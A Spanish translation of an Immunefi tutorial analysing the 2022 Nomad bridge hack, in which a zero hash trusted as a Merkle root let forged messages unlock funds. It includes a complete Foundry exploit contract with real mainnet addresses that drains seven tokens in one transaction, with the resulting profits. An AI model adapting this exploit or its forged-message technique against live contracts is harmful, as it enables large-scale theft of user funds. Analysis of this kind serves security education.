# Debugging/Análisis OnChain de Transacciones: 7. Análisis de Hack: Puente Nomad (2022/08)

Autor: [gmhacker.eth](https://twitter.com/realgmhacker)

Traducción: [JP](https://x.com/CanonicalJP) 

Comunidad [Discord](https://discord.gg/Fjyngakf3h)

## Introducción
El puente Nomad fue hackeado el 1 de agosto de 2022, y se drenaron $190 millones de fondos bloqueados. Después de que un atacante lograra aprovechar la vulnerabilidad y diera en el blanco, otros viajeros del bosque oscuro se apresuraron a replicar el exploit en lo que eventualmente se convirtió en un hack colosal y "colaborativo".

Una actualización rutinaria en la implementación de uno de los contratos proxy de Nomad marcó un valor hash cero como una raíz confiable, lo que permitió que los mensajes se probaran automáticamente. El hacker aprovechó esta vulnerabilidad para suplantar el contrato del puente y engañarlo para que desbloqueara fondos.

Esa primera transacción exitosa por sí sola, que se puede ver [aquí](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), drenó 100 WBTC del puente, alrededor de $2.3 millones en ese momento. No hubo necesidad de un flash loan u otra interacción compleja con otro protocolo DeFi. El ataque simplemente llamó a una función en el contrato con el mensaje de entrada correcto, y el atacante continuó asestando golpes a la liquidez del protocolo.

Desafortunadamente, la naturaleza simple y repetible de la transacción llevó a otros a recolectar parte de la ganancia ilícita. Como [Rekt News](https://rekt.news/nomad-rekt/) lo expresó, "Manteniéndose fiel a los Principios DeFi, este hack fue sin permisos — cualquiera podía unirse".

En este artículo, analizaremos la vulnerabilidad explotada en el contrato Replica del puente Nomad, y luego crearemos nuestra propia versión del ataque para drenar toda la liquidez en una transacción, probándola contra una bifurcación local. Puedes revisar el PoC completo [aquí](https://github.com/immunefi-team/hack-analysis-pocs/tree/main/src/nomad-august-2022).

Este artículo fue escrito por [gmhacker.eth](https://twitter.com/realgmhacker), un Triager de Contratos Inteligentes de Immunefi.

## Antecedentes

Nomad es un protocolo de comunicación entre blockchains que permite, entre otras cosas, el puente de tokens entre Ethereum, Moonbeam y otras blockchains. Los mensajes enviados a los contratos de Nomad son verificados y transportados a otras blockchains a través de agentes off-chain, siguiendo un mecanismo de verificación optimista.

Como la mayoría de los protocolos de puente entre blockchains, el puente de tokens de Nomad es capaz de transferir valor a través de diferentes blockchains mediante un proceso de bloqueo de tokens en un lado y creación de tokens representativos en el otro. Debido a que esos tokens representativos pueden eventualmente ser quemados para desbloquear los fondos originales (es decir, volver a hacer puente a la blockchain nativa del token), funcionan como pagarés y tienen el mismo valor económico que los ERC-20 originales. Este aspecto de los puentes en general lleva a una gran acumulación de fondos dentro de un contrato inteligente complejo, convirtiéndolo en un objetivo muy deseado para los hackers.

<div align=center>
<img src="https://user-images.githubusercontent.com/107821372/217752487-9580592c-98ed-4690-b330-d211d795d276.png" alt="Cover" width="80%"/>
</div>

Proceso de bloqueo y creación, fuente: [Blog de MakerDAO](https://blog.makerdao.com/what-are-blockchain-bridges-and-why-are-they-important-for-defi/)

En el caso de Nomad, un contrato llamado `Replica`, que se despliega en todas las blockchains soportadas, es responsable de validar los mensajes en una estructura de árbol de Merkle. Otros contratos en el protocolo dependen de esto para la autenticación de mensajes entrantes. Una vez que un mensaje es validado, se almacena en el árbol de Merkle, generando una nueva raíz de árbol que se confirma para ser procesada.

## Causa Raíz

Teniendo una comprensión general de lo que es el puente Nomad, podemos profundizar en el código real del contrato inteligente para explorar la vulnerabilidad de causa raíz que se aprovechó en las diversas transacciones del hack de agosto de 2022. Para hacer esto, necesitamos adentrarnos más en el contrato `Replica`.

```solidity
   function process(bytes memory _message) public returns (bool _success) {
       // ensure message was meant for this domain
       bytes29 _m = _message.ref(0);
       require(_m.destination() == localDomain, "!destination");
       // ensure message has been proven
       bytes32 _messageHash = _m.keccak();
       require(acceptableRoot(messages[_messageHash]), "!proven");
       // check re-entrancy guard
       require(entered == 1, "!reentrant");
       entered = 0;
       // update message status as processed
       messages[_messageHash] = LEGACY_STATUS_PROCESSED;
       // call handle function
       IMessageRecipient(_m.recipientAddress()).handle(
           _m.origin(),
           _m.nonce(),
           _m.sender(),
           _m.body().clone()
       );
       // emit process results
       emit Process(_messageHash, true, "");
       // reset re-entrancy guard
       entered = 1;
       // return true
       return true;
   }
```

<div align=center>

Fragmento 1: función `process` en Replica.sol, ver [raw](https://gist.github.com/gists-immunefi/f8ef00be9e1c5dd4d879a418966191e0#file-nomad-hack-analysis-1-sol).

</div>

La [función](https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8#code%23F1%23L179) `process` en el contrato `Replica` es responsable de enviar un mensaje a su destinatario final. Esto solo tendrá éxito si el mensaje de entrada ya ha sido probado, lo que significa que el mensaje ya ha sido añadido al árbol de Merkle, llevando a una raíz aceptada y confiable. Esa verificación se realiza contra el hash del mensaje, usando la función `acceptableRoot`, que leerá del mapeo de raíces confirmadas.

```solidity
   function initialize(
       uint32 _remoteDomain,
       address _updater,
       bytes32 _committedRoot,
       uint256 _optimisticSeconds
   ) public initializer {
       __NomadBase_initialize(_updater);
       // set storage variables
       entered = 1;
       remoteDomain = _remoteDomain;
       committedRoot = _committedRoot;
       // pre-approve the committed root.
       confirmAt[_committedRoot] = 1;
       _setOptimisticTimeout(_optimisticSeconds);
   }
```

<div align=center>

Fragmento 2: función `initialize` en Replica.sol, ver [raw](https://gist.github.com/gists-immunefi/4792c4bb10d3f73648b4b0f86e564ac9#file-nomad-hack-analysis-2-sol).

</div>

Cuando ocurre una actualización en la implementación de un contrato proxy dado, la lógica de actualización puede ejecutar una función de inicialización de una sola llamada. Esta función establecerá algunos valores de estado iniciales. En particular, se realizó una [actualización rutinaria el 21 de abril](https://openchain.xyz/trace/ethereum/0x99662dacfb4b963479b159fc43c2b4d048562104fe154a4d0c2519ada72e50bf), y el valor 0x00 se pasó como la raíz pre-aprobada, que se almacena en el mapeo `confirmAt`. Aquí es donde apareció la vulnerabilidad.

Volviendo a la función `process()`, vemos que dependemos de verificar un hash de mensaje en el mapeo `messages`. Ese mapeo es responsable de marcar los mensajes como procesados, para que los atacantes no puedan reproducir el mismo mensaje.

Un aspecto particular del almacenamiento de contratos inteligentes EVM es que todos los slots se inicializan virtualmente como valores cero, lo que significa que si uno lee un slot no utilizado en el almacenamiento, no generará una excepción sino que devolverá 0x00. Un corolario de esto es que cada clave no utilizada en un mapeo de Solidity devolverá 0x00. Siguiendo esa lógica, siempre que el hash del mensaje no esté presente en el mapeo `messages`, se devolverá 0x00, y eso se pasará a la función `acceptableRoot`, que a su vez devolverá true dado que 0x00 se ha establecido como una raíz confiable. El mensaje se marcará entonces como procesado, pero cualquiera puede simplemente cambiar el mensaje para crear uno nuevo no utilizado y volver a enviarlo.

El mensaje de entrada codifica varios parámetros diferentes en un formato dado. Entre ellos, para que un mensaje desbloquee fondos del puente, está la dirección del destinatario. Así que después de que el primer atacante ejecutó una [transacción exitosa](https://dashboard.tenderly.co/tx/mainnet/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), cualquiera que supiera cómo decodificar el formato del mensaje podía simplemente cambiar la dirección del destinatario y reproducir la transacción de ataque, esta vez con un mensaje diferente que daría beneficios a la nueva dirección.

## Prueba de Concepto

Ahora que entendemos la vulnerabilidad que comprometió el protocolo Nomad, podemos formular nuestra propia prueba de concepto (PoC). Crearemos mensajes específicos para llamar a la función `process` en la función `Replica` una vez por cada token específico que queremos drenar, llevando a la insolvencia del protocolo en una sola transacción.

Comenzaremos seleccionando un proveedor RPC con acceso de archivo. Para esta demostración, usaremos [el agregador RPC público gratuito](https://www.ankr.com/rpc/eth/) proporcionado por Ankr. Seleccionamos el número de bloque 15259100 como nuestro bloque de bifurcación, 1 bloque antes de la primera transacción del hack.

Nuestro PoC necesita ejecutar una serie de pasos en una sola transacción para tener éxito. Aquí hay una visión general de alto nivel de lo que implementaremos en nuestro PoC de ataque:

1. Seleccionar un token ERC-20 dado y verificar el saldo del contrato puente ERC-20 de Nomad.
2. Generar un payload de mensaje con los parámetros correctos para desbloquear fondos, entre los cuales está nuestra dirección de atacante como destinatario y el saldo total de tokens como la cantidad de fondos a desbloquear.
3. Llamar a la función `process` vulnerable, lo que llevará a una transferencia de tokens a la dirección del destinatario.
4. Recorrer varios tokens ERC-20 con una presencia relevante en el saldo del puente para drenar esos fondos de la misma manera.

Vamos a codificar un paso a la vez, y eventualmente veremos cómo se ve el PoC completo. Usaremos Foundry.

## El Ataque

```solidity
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = IERC20(token).balanceOf(ERC20_BRIDGE);
 
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory) {}
}
```

<div align=center>

Fragmento 3: El inicio de nuestro contrato de ataque, ver [raw](https://gist.github.com/gists-immunefi/4305df38623ddcaa11812a9c186c73ac#file-nomad-hack-analysis-3-sol).

</div>

Comencemos creando nuestro contrato Attacker. El punto de entrada a nuestro contrato será la función `attack`, que es tan simple como un bucle for que recorre varias direcciones de tokens diferentes. Verificamos el saldo de `ERC20_BRIDGE` del token específico con el que estamos tratando. Esta es la dirección del contrato puente ERC-20 de Nomad, que mantiene los fondos bloqueados en Ethereum.

Después de eso, se genera el payload del mensaje malicioso. Los parámetros que cambiarán en cada iteración del bucle son la dirección del token y la cantidad de fondos a transferir. El mensaje generado será la entrada para la función `IReplica.process`. Como ya establecimos, esta función enviará el mensaje codificado al contrato final correcto en el protocolo Nomad para llevar a cabo la solicitud de desbloqueo y transferencia, engañando efectivamente a la lógica del puente.

```solidity
contract Attacker {
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),            // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),        // Recipient of the transfer
           uint256(amount),                    // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```

<div align=center>

Fragmento 4: Generar el mensaje malicioso con el formato y parámetros correctos, ver [raw](https://gist.github.com/gists-immunefi/2a5fbe2e6034dd30534bdd4433b52a29#file-nomad-hack-analysis-4-sol).

</div>

El mensaje generado necesita ser codificado con varios parámetros diferentes, para que sea desempaquetado correctamente por el protocolo. Es importante especificar la ruta de reenvío del mensaje — las direcciones del router del puente y del puente ERC-20. Debemos marcar el mensaje como una transferencia de token, de ahí el valor `0x3` como tipo.

Finalmente, tenemos que especificar los parámetros que nos traerán el beneficio — la dirección correcta del token, la cantidad a transferir y el destinatario de esa transferencia. Como ya hemos visto, esto seguramente creará un mensaje original completamente nuevo que nunca habrá sido procesado por el contrato `Replica`, lo que significa que en realidad será visto como válido, según nuestra explicación anterior.

Bastante impresionante, esto completa toda la lógica del exploit. Si tuviéramos algunos registros de Foundry, nuestro PoC aún sumaría solo 87 líneas de código.

Si ejecutamos este PoC contra el número de bloque bifurcado, obtendremos los siguientes beneficios:

* 1,028 WBTC
* 22,876 WETH
* 87,459,362 USDC
* 8,625,217 USDT
* 4,533,633 DAI
* 119,088 FXS
* 113,403,733 CQT

## Conclusión

El exploit del Puente Nomad fue uno de los mayores hacks de 2022. El ataque enfatiza la importancia de la seguridad en todo el protocolo. En este caso particular, hemos aprendido cómo una sola actualización rutinaria en una implementación de proxy puede causar una vulnerabilidad crítica y comprometer todos los fondos bloqueados. Además, durante el desarrollo, uno debe tener cuidado con los valores predeterminados 0x00 en los slots de almacenamiento, especialmente en la lógica que involucra mapeos. También es bueno tener alguna configuración de pruebas unitarias para tales valores comunes que podrían llevar a vulnerabilidades.

Cabe señalar que algunas cuentas de carroñeros que drenaron porciones de los fondos los devolvieron al protocolo. Hay [planes para relanzar el puente](https://medium.com/nomad-xyz-blog/nomad-bridge-relaunch-guide-3a4ef6624f90), y los activos devueltos se distribuirán a los usuarios a través de acciones proporcionales de esos fondos recuperados. Cualquier fondo robado puede ser devuelto a la [cartera de recuperación](https://etherscan.io/address/0x94a84433101a10aeda762968f6995c574d1bf154) de Nomad.

Como se señaló anteriormente, este PoC en realidad mejora el hack y drena todo el TVL en una transacción. Es un ataque más simple que lo que realmente ocurrió en la realidad. Así es como se ve nuestro PoC completo, con la adición de algunos logs útiles de Foundry:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
 
import "@openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/console.sol";
 
interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}
 
contract Attacker {
   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   // tokens
   address [] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];
 
   function attack() external {
       for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);
 
           console.log(
               "[*] Stealing",
               amount_bridge / 10**ERC20(token).decimals(),
               ERC20(token).symbol()
           );
           console.log(
               "    Attacker balance before:",
               ERC20(token).balanceOf(msg.sender)
           );
 
           // Generate the payload with all of the tokens stored on the bridge
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
 
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
 
           console.log(
               "    Attacker balance after: ",
               IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals()
           );
       }
   }
 
   function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),          // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),      // Recipient of the transfer
           uint256(amount),                  // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}
```

<div align=center>

Fragmento 5: todo el código, ver [raw](https://gist.github.com/gists-immunefi/2bdffe6f9683c9b3ab810e1fb7fe4aff#file-nomad-hack-analysis-5-sol).

</div>
